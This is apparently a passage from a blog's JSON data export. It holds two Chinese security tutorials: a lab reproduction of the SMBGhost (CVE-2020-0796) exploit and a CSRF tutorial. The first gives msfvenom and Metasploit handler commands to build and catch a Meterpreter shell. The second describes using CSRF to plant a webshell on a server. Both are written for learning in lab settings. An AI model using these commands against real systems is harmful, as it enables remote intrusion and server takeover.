shellcode.txt\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334568518-bf92759e-47dc-4baf-aa81-34b93d062fb5.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=904&status=done&style=none&width=415)\n2、通过exp利用脚本利用shellcode\n下载地址：\n[https://github.com/chompie1337/SMBGhost_RCE_PoC.git](https://github.com/chompie1337/SMBGhost_RCE_PoC.git)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569014-643b6bf8-1e45-4460-b2ca-73a429003a20.png#align=left&display=inline&height=135&margin=%5Bobject%2Object%5D&originHeight=274&originWidth=840&status=done&style=none&width=415)\n3、将生成的shellcode的内容中的buf替换成USER_PAYLOAD\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569620-761f2972-b589-41e2-a758-254b9602efd6.png#align=left&display=inline&height=193&margin=%5Bobject%2Object%5D&originHeight=880&originWidth=1891&status=done&style=none&width=415)\n4、替换exploit.py中的USER_PAYLOAD的内容\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570095-2198b1d8-4fc8-4ca7-a05b-51586636e251.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=918&originWidth=1920&status=done&style=none&width=416)\n5、msf开启监听\nmsfconsole\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/bind_tcp\nset lport 9999\nset rhost 192.168.229.166\nexploit\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570644-dbf6a715-ac0b-4bf2-9829-d1d26e4abd67.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=203&originWidth=703&status=done&style=none&width=415)\n6、在靶机执行exploit.py脚本\npython3 exploit.py -ip 192.168.229.166\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570993-a6fdfee2-18d7-459b-9c7b-258055be8e28.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&originHeight=96&originWidth=531&status=done&style=none&width=319)\n然后，成功蓝屏。。。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334571514-1b5042a8-4fd1-40b2-a3fa-6ff187bcfc6b.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&originHeight=480&originWidth=640&status=done&style=none&width=384)\n","slug":"漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）","published":1,"updated":"2021-08-07T16:22:51.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfo001ivkq35o2gb3ou","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>虚拟机wmware<br>Windows10<br>下载地址：<br>迅雷下载 ：<br>ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|</p>\n<h2 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h2><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。<br>攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。<br>该漏洞的后果十分接近永恒之蓝系列，都利用Windows SMB漏洞远程攻击获取系统最高权限，WannaCry勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击SMB服务端造成RCE外，该漏洞得亮点在于对SMB客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录，OFFICE文档等多种方式触发漏洞进行攻击。</p>\n<h2 id=\"漏洞影响\"><a href=\"#漏洞影响\" class=\"headerlink\" title=\"漏洞影响\"></a>漏洞影响</h2><p>漏洞不影响win7，漏洞影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p>\n<h2 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h2><h4 id=\"测试是否能ping通靶机\"><a href=\"#测试是否能ping通靶机\" class=\"headerlink\" title=\"测试是否能ping通靶机\"></a>测试是否能ping通靶机</h4><p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334566921-50d4d448-988a-485c-a60f-e55470131666.png\"><br>如果ping不通，可能情况是靶机开启了防护墙Windows defender，可以手动进行关闭<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567523-b4c59e2c-b836-42e7-bba5-a8b2250d1bac.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&originHeight=888&originWidth=1578&status=done&style=none&width=415\"></p>\n<h4 id=\"检测漏洞存在\"><a href=\"#检测漏洞存在\" class=\"headerlink\" title=\"检测漏洞存在\"></a>检测漏洞存在</h4><p>使用exp检测漏洞存在<br>下载地址：<br><a href=\"http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip\">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a><br>使用方法：<br>下载后使用CVE-2020-0796-Scanner.exe，输入ip地址即可<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567969-a968efd6-ec6e-4098-8450-253287c8347d.png#align=left&display=inline&height=59&margin=%5Bobject%2Object%5D&originHeight=170&originWidth=1196&status=done&style=none&width=415\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>1、通过 MSF 生成 shellcode：<br>msfvenom -p windows/x64/meterpreter/bind_tcp lport=9999 -f py -o shellcode.txt<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334568518-bf92759e-47dc-4baf-aa81-34b93d062fb5.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=904&status=done&style=none&width=415\"><br>2、通过exp利用脚本利用shellcode<br>下载地址：<br><a href=\"https://github.com/chompie1337/SMBGhost_RCE_PoC.git\">https://github.com/chompie1337/SMBGhost_RCE_PoC.git</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569014-643b6bf8-1e45-4460-b2ca-73a429003a20.png#align=left&display=inline&height=135&margin=%5Bobject%2Object%5D&originHeight=274&originWidth=840&status=done&style=none&width=415\"><br>3、将生成的shellcode的内容中的buf替换成USER_PAYLOAD</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569620-761f2972-b589-41e2-a758-254b9602efd6.png#align=left&display=inline&height=193&margin=%5Bobject%2Object%5D&originHeight=880&originWidth=1891&status=done&style=none&width=415\"><br>4、替换exploit.py中的USER_PAYLOAD的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570095-2198b1d8-4fc8-4ca7-a05b-51586636e251.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=918&originWidth=1920&status=done&style=none&width=416\"><br>5、msf开启监听<br>msfconsole<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/bind_tcp<br>set lport 9999<br>set rhost 192.168.229.166<br>exploit<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570644-dbf6a715-ac0b-4bf2-9829-d1d26e4abd67.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=203&originWidth=703&status=done&style=none&width=415\"><br>6、在靶机执行exploit.py脚本<br>python3 exploit.py -ip 192.168.229.166<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570993-a6fdfee2-18d7-459b-9c7b-258055be8e28.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&originHeight=96&originWidth=531&status=done&style=none&width=319\"><br>然后，成功蓝屏。。。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334571514-1b5042a8-4fd1-40b2-a3fa-6ff187bcfc6b.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&originHeight=480&originWidth=640&status=done&style=none&width=384\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>虚拟机wmware<br>Windows10<br>下载地址：<br>迅雷下载 ：<br>ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|</p>\n<h2 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h2><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。<br>攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。<br>该漏洞的后果十分接近永恒之蓝系列，都利用Windows SMB漏洞远程攻击获取系统最高权限，WannaCry勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击SMB服务端造成RCE外，该漏洞得亮点在于对SMB客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录，OFFICE文档等多种方式触发漏洞进行攻击。</p>\n<h2 id=\"漏洞影响\"><a href=\"#漏洞影响\" class=\"headerlink\" title=\"漏洞影响\"></a>漏洞影响</h2><p>漏洞不影响win7，漏洞影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p>\n<h2 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h2><h4 id=\"测试是否能ping通靶机\"><a href=\"#测试是否能ping通靶机\" class=\"headerlink\" title=\"测试是否能ping通靶机\"></a>测试是否能ping通靶机</h4><p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334566921-50d4d448-988a-485c-a60f-e55470131666.png\"><br>如果ping不通，可能情况是靶机开启了防护墙Windows defender，可以手动进行关闭<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567523-b4c59e2c-b836-42e7-bba5-a8b2250d1bac.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&originHeight=888&originWidth=1578&status=done&style=none&width=415\"></p>\n<h4 id=\"检测漏洞存在\"><a href=\"#检测漏洞存在\" class=\"headerlink\" title=\"检测漏洞存在\"></a>检测漏洞存在</h4><p>使用exp检测漏洞存在<br>下载地址：<br><a href=\"http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip\">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a><br>使用方法：<br>下载后使用CVE-2020-0796-Scanner.exe，输入ip地址即可<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567969-a968efd6-ec6e-4098-8450-253287c8347d.png#align=left&display=inline&height=59&margin=%5Bobject%2Object%5D&originHeight=170&originWidth=1196&status=done&style=none&width=415\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>1、通过 MSF 生成 shellcode：<br>msfvenom -p windows/x64/meterpreter/bind_tcp lport=9999 -f py -o shellcode.txt<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334568518-bf92759e-47dc-4baf-aa81-34b93d062fb5.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=904&status=done&style=none&width=415\"><br>2、通过exp利用脚本利用shellcode<br>下载地址：<br><a href=\"https://github.com/chompie1337/SMBGhost_RCE_PoC.git\">https://github.com/chompie1337/SMBGhost_RCE_PoC.git</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569014-643b6bf8-1e45-4460-b2ca-73a429003a20.png#align=left&display=inline&height=135&margin=%5Bobject%2Object%5D&originHeight=274&originWidth=840&status=done&style=none&width=415\"><br>3、将生成的shellcode的内容中的buf替换成USER_PAYLOAD</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569620-761f2972-b589-41e2-a758-254b9602efd6.png#align=left&display=inline&height=193&margin=%5Bobject%2Object%5D&originHeight=880&originWidth=1891&status=done&style=none&width=415\"><br>4、替换exploit.py中的USER_PAYLOAD的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570095-2198b1d8-4fc8-4ca7-a05b-51586636e251.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=918&originWidth=1920&status=done&style=none&width=416\"><br>5、msf开启监听<br>msfconsole<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/bind_tcp<br>set lport 9999<br>set rhost 192.168.229.166<br>exploit<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570644-dbf6a715-ac0b-4bf2-9829-d1d26e4abd67.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=203&originWidth=703&status=done&style=none&width=415\"><br>6、在靶机执行exploit.py脚本<br>python3 exploit.py -ip 192.168.229.166<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570993-a6fdfee2-18d7-459b-9c7b-258055be8e28.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&originHeight=96&originWidth=531&status=done&style=none&width=319\"><br>然后，成功蓝屏。。。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334571514-1b5042a8-4fd1-40b2-a3fa-6ff187bcfc6b.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&originHeight=480&originWidth=640&status=done&style=none&width=384\"></p>\n"},{"title":"被忽视的漏洞-CSRF跨站请求伪造","keywords":"web安全,CSRF,Cookie","description":"从CSRF漏洞学习cookie对于web安全的危害","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.pianshen.com%2Fimages%2F744%2F5338f05ea641c337635df38c44dcd4f0.png&refer=http%3A%2F%2Fwww.pianshen.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747376&t=8d4387e192b14d4412c6f21e854951f5","date":"2020-11-09T08:17:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 前言\n\n几天前，有位师傅联系我询问CSRF的事，最近也刚好在学习CSRF，就弄出一篇文章出来吧。CSRF在我眼里，真的是被大家低估了的漏洞，配合好社会工程学的话，我觉得在现在大家对于sql注入，xss，文件上传的防护都很重视的情况下，CSRF能够造成意想不到的效果。\nCSRF简介\nCSRF（**跨站请求伪造**），是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟[跨网站脚本](https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC)（XSS）相比，**XSS** 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。\n\n# 0x02 Cookie\n\n这里需要了解一个概念，cookie，一串字符串，是网站辨别用户的标识，也可以这样理解，拿到了某用户在某网站的cookie，我就可以登录他在那个网站的账号。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317575665-8a8af458-2a41-42ba-ab39-dc1b0ccb3997.png#align=left&display=inline&height=193&margin=%5Bobject%20Object%5D&originHeight=822&originWidth=1764&status=done&style=none&width=415)\n这里扯一嘴，偷取cookie是XSS做的事，CSRF的作用是借用cookie，并不能获取cookie。\n\n# 0x03 CSRF原理\n\n接下来进行CSRF的讲解，我是这样理解CSRF的，它通过构造一个poc，让已经登录某网站的用户访问，这个poc便会以该用户的cookie来操作网站，对于那个受害者来说，他点击了我的链接，浏览器就偷偷进行了一些操作。\n\n# 0x04 危害\n\n攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。\n\n# 0x05 检测CSRF漏洞\n\n检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。当然也可以像我这样，看看有没有Token字段，没有就先认为存在。（Token是一种防御CSRF的机制，也是目前使用相对较好的防御方法，会在后面进行解释）\n\n通过CSRF 修改受害者的个人信息\n1.首先打开靶场\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576172-fdae19b7-7517-4745-bbd1-d3108537ec73.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&originHeight=902&originWidth=1920&status=done&style=none&width=416)\n2.注册一个新用户\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576618-3c455c98-0ccd-4585-935a-026da67cd7aa.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&originHeight=902&originWidth=1920&status=done&style=none&width=416)\n3.这是注册成功后的界面，可以看到有个用户管理\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576852-50d8a2b8-4766-4030-acd6-4f25e300c97f.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&originHeight=735&originWidth=1669&status=done&style=none&width=416)\n\n4.点击我的个人资料，对于我的账号进行一些修改\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317577219-a78ec569-bb05-4d57-a4bb-f211c4f3a77c.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=931&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317577777-d9f0f503-a28b-4f2f-822b-42caf10fe7e9.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=755&originWidth=1342&status=done&style=none&width=415)\n5.通过burp抓取这个修改包，做成CSRF的poc\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317578303-f5676351-cfb0-459b-a596-d8dc8e1ec799.png#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&originHeight=863&originWidth=1704&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317578849-a5f906aa-3d34-4a14-9378-c5b320e8a8b7.png#align=left&display=inline&height=375&margin=%5Bobject%20Object%5D&originHeight=787&originWidth=871&status=done&style=none&width=415)\n6.这里我将代码存在CSRF.html\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317579367-678ec02a-3533-4bd7-b396-bece13463417.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&originHeight=421&originWidth=1191&status=done&style=none&width=416)\n7.接下来，我们需要社工，诱骗登录了该网站的受害者点击我们的链接，这里因为是演示，就直接拿我的管理员账号来试试了。首先看看我的admin1的账号信息，这里都是admin1\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317579884-76ddacfe-cb5a-4ead-93bc-a6aa3f7e701d.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&originHeight=835&originWidth=1601&status=done&style=none&width=415)\n8.登录了用户后，(也可以关闭该页面，cookie在登录之后是有一定的存在时间的)，在这个浏览器，访问poc的链接\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317580294-17a7df2a-59fa-4d4b-b163-26f164792b43.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&originHeight=278&originWidth=829&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317580878-91f8b916-affe-45c8-a056-d423965a1fae.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&originHeight=189&originWidth=705&status=done&style=none&width=415)\n9.点击按钮之后，回去看我的账号信息，已经变成了刚刚我做成的poc的内容\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317582113-1a84b1d7-d28f-4b7f-abe8-85c8ad0c180e.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&originHeight=727&originWidth=1295&status=done&style=none&width=416)\n\n这就是简单的CSRF的功能，看着好像危害不大的样子，那么接下来让大家看看，通过CSRF来getshell。\n\n# 0x06 通过CSRF来getshell\n\n## 1、什么是shell？\nshell就是一个脚本文件，我们通过这个脚本文件来管理或者控制服务器的文件、数据库等信息。\n## 2、如何getshell？\n目的是将脚本文件上传到服务器，并让服务器解析。脚本文件可以是asp、php、jsp等。\n\n## 3、流程\n\n1.首先打开我本机上的某cms的后台\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317582636-ffccb573-3a21-4b5a-88c3-6d6162562111.png#align=left&display=inline&height=231&margin=%5Bobject%20Object%5D&originHeight=696&originWidth=1256&status=done&style=none&width=416)\n\n\n2.通过上传一句话木马构造CSRFpoc\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317583155-5333caa9-9546-4baa-9017-ffeca88fda3c.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&originHeight=671&originWidth=1580&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317583689-637dfc12-9278-4ddc-8a7a-afecfe13d07b.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&originHeight=675&originWidth=940&status=done&style=none&width=415)\n\n3.将poc保存为html文件，这里我进行了一些配置，设置页面为打开直接自动点击。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317584018-ca75c982-737a-41a2-8a22-c05aed0a2f4e.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&originHeight=703&originWidth=1920&status=done&style=none&width=477)\n4.到靶机处，登录它的网站，可以看到，这个网站的ip为靶机的，这个网站与我构造poc  的网站不是同一个。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317584541-63e6ebf9-7b18-43b8-8134-b5d40d4b90cb.png#align=left&display=inline&height=245&margin=%5Bobject%20Object%5D&originHeight=749&originWidth=1270&status=done&style=none&width=415)\n5.接下来，通过靶机访问构造好的html\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317585031-bbcac406-020f-4caa-a996-7ce4857b9d46.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=384&originWidth=1164&status=done&style=none&width=416)\n6.点击之后，一闪而过了保存文件的界面之后跳出了文件管理器，看到IP知道文件已经保存成功了。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317585542-404664fc-7061-4812-a95f-8ffff4562569.png#align=left&display=inline&height=184&margin=%5Bobject%20Object%5D&originHeight=568&originWidth=1280&status=done&style=none&width=415)\n还是验证一下吧，回去之前那个页面刷新后发现确实保存成功了\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317586014-06a09b2f-9033-4715-a5d2-20a7dc0a4e97.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=761&originWidth=1273&status=done&style=none&width=415)\n7.现在也就是说我已经将木马文件放到对方的服务器上了，接下来回到本机，连接菜刀，拿下服务器\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317586564-9db664a5-45ff-497f-a00b-7024fd2d4a17.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1625&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317587075-2f880b21-12a0-4fc7-91e5-9803851f01ff.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1625&status=done&style=none&width=416)\n\n# 0x07 防御CSRF\n1.验证 HTTP Referer 字段\n根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。这种验证方法通过查看referer来验证CSRF攻击的数据包是否是用户自己的操作，当然因为可以伪造referer，所以现在比较没有那么流行。\n2.Token机制\n可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。一般为了预防CSRF或者其他攻击，都能够在抓包处发现存在token字段，有的是get传参，有的是post传参。token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，如果token一样，则执行操作，token不一样就不予执行。\n3.在 HTTP 头中自定义属性并验证\n\n# 0x08 总结思考\nCSRF漏洞因为需要受害者点击才能够触发，所以经常不被重视，但是正是这种情况下，CSRF能够造成的危害会比想象中要大。嗯嗯，社会工程学就是高端的欺骗，具体可以百度学习一下。本篇文章就到这里了，对于实验中的环境，工具，有需要的可以添加我的微信获取。\n","source":"_posts/被忽视的漏洞-CSRF跨站请求伪造.md","raw":"---\ntitle: 被忽视的漏洞-CSRF跨站请求伪造\ntags: \n  - web安全\n  - CSRF\n  - Cookie\ncategories: web安全\nkeywords: 'web安全,CSRF,Cookie'\ndescription: 从CSRF漏洞学习cookie对于web安全的危害\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.pianshen.com%2Fimages%2F744%2F5338f05ea641c337635df38c44dcd4f0.png&refer=http%3A%2F%2Fwww.pianshen.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747376&t=8d4387e192b14d4412c6f21e854951f5\ndate: 2020-11-09 16:17:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 前言\n\n几天前，有位师傅联系我询问CSRF的事，最近也刚好在学习CSRF，就弄出一篇文章出来吧。CSRF在我眼里，真的是被大家低估了的漏洞，配合好社会工程学的话，我觉得在现在大家对于sql注入，xss，文件上传的防护都很重视的情况下，CSRF能够造成意想不到的效果。\nCSRF简介\nCSRF（**跨站请求伪造**），是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟[跨网站脚本](https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC)（XSS）相比，**XSS** 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。\n\n# 0x02 Cookie\n\n这里需要了解一个概念，cookie，一串字符串，是网站辨别用户的标识，也可以这样理解，拿到了某用户在某网站的cookie，我就可以登录他在那个网站的账号。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317575665-8a8af458-2a41-42ba-ab39-dc1b0ccb3997.png#align=left&display=inline&height=193&margin=%5Bobject%20Object%5D&originHeight=822&originWidth=1764&status=done&style=none&width=415)\n这里扯一嘴，偷取cookie是XSS做的事，CSRF的作用是借用cookie，并不能获取cookie。\n\n# 0x03 CSRF原理\n\n接下来进行CSRF的讲解，我是这样理解CSRF的，它通过构造一个poc，让已经登录某网站的用户访问，这个poc便会以该用户的cookie来操作网站，对于那个受害者来说，他点击了我的链接，浏览器就偷偷进行了一些操作。\n\n# 0x04 危害\n\n攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。\n\n# 0x05 检测CSRF漏洞\n\n检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。当然也可以像我这样，看看有没有Token字段，没有就先认为存在。（Token是一种防御CSRF的机制，也是目前使用相对较好的防御方法，会在后面进行解释）\n\n通过CSRF 修改受害者的个人信息\n1.首先打开靶场\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576172-fdae19b7-7517-4745-bbd1-d3108537ec73.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&originHeight=902&originWidth=1920&status=done&style=none&width=416)\n2.注册一个新用户\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576618-3c455c98-0ccd-4585-935a-026da67cd7aa.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&originHeight=902&originWidth=1920&status=done&style=none&width=416)\n3.这是注册成功后的界面，可以看到有个用户管理\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576852-50d8a2b8-4766-4030-acd6-4f25e300c97f.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&originHeight=735&originWidth=1669&status=done&style=none&width=416)\n\n4.点击我的个人资料，对于我的账号进行一些修改\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317577219-a78ec569-bb05-4d57-a4bb-f211c4f3a77c.png#align=left&display=inline&height=128&margin=%